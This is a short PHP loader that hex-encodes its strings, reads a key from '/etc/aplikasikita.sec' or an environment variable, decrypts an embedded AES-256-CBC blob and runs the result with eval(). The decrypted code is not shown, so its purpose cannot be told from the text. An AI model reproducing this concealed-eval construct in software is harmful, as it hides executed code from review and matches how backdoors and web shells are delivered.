<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('Iehq3XpxYYG5qzS8rwqKgQ==');

$c=base64_decode(

'er1q42GiFFZub7rJ9hq/Ltfkn9EwAjcrjDTuhSXMcrlh5Rd9Jy1uHMlB7f6RSlkVaQVurSB1IVDv' .
'A15crIOPU34N+MXi48bVSzdw45W3m0RvLmXagXVl+uisW6jo2uHFyzbNh+khhq9ajDcsPLGC6KXX' .
't0XEGVFtLwAkDYkUnhkCb6okafEY3KIg1PQyAnUxw3vvZWO5j4dnpDxDjeW8EMtRQsWBEczLeE/o' .
'HkPs0ZynhYhBrHh6JzyN1kPkqH5T3Gea749Yi52nHS/N5zygn5Gem3+y789yXXVWaqLggCUmYcrS' .
'mscQbafN+vALFBA377EaJhaRthclAhgGypNrQy6z/QW7ReiHTSGgH8iNSWWh1b/K2CauWt2V/FpN' .
'71MDhQs86huMHON14MraYeHIs1d0nG+D5iLhGBq7IBGP/VkN9UXGemOBa+YvnEAjaedQ1ReKQuoZ' .
'19V4/4pZYFU8u5wbgybnjWm4AhcR3KIaT70oxWgH7+XK+wZSjJAhhrotK4qyWrrEHkWGrU2jAvJW' .
'OU5rtKHP4t9ucU7mOdans/g0Hf/dIxk8gkkW9kE/sjtoYTFhmZJis6R/RA7stsT4NYPwTGr56ISO' .
'nE46jQ1snnbMx8MkJwo9wtJChXmFveVTwc1AWuzPsC5fAdOclfFdnGQT4pm+0XO4PXQ0L0Fd2WrS' .
'FmUMVWpmcToTvGWukQluHF4s/lSoHKDP0vMOCWtMsGotIpQc4NoThefsp0aZZuDxsl00K3H5aGzi' .
'wlfH89ONIGAVtrWW/VqiI9EUF6nSw6wPdIc2msEnd+PpiMq+JyWAyk4ARXBLYAOYdaVjRym19YP3' .
'Yx7fvdmQ33WzpP5kgviDMrKRLG8BXyps0H1769S7D1mJwDXhu5X9r9wxOkJ8bXjQ4cpPzTfLOR2F' .
'f0j0iheRf6Wl/lkLfF1AB8HI9Q49clfSfrnx4idIqdmnpVC+mvui9Qck40iyVdkbALXCYrLwM181' .
'Y2CD98B29DJWePTevdD2Ha4QZ4MzACPVprAEIXW7lN1oF66jbXhzhEZBayJ7YSbAr038ecNVunfE' .
'InLqSLFSqV7n5joi5h7rJ2uOH0sdZ8n9O6c2VtB4CuvSa7WVnSAcb1j50PKoGTBlbB2GO++Toh6Y' .
'6YEqmJA/MzFVQA7TORRvg7mvpllbq7qYdQUDa+BQ3qURV15Ck8LvueQZYQjKMaG/wsV/NAf3CX62' .
'Puk1thiyam0yGbP1mL7ZLy2gm0h/9F5YqvbqRTvIzXPdwZ+/c5bs9C9WAO1uBmTNcCYXse4QEgYa' .
'qCuGE5GMsHvKym6AJK7r220dwWlvjWlO7o1Q6VDpLJ9+hUaXBj/1r34o0JnDgZuX/M3/pXNYpw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

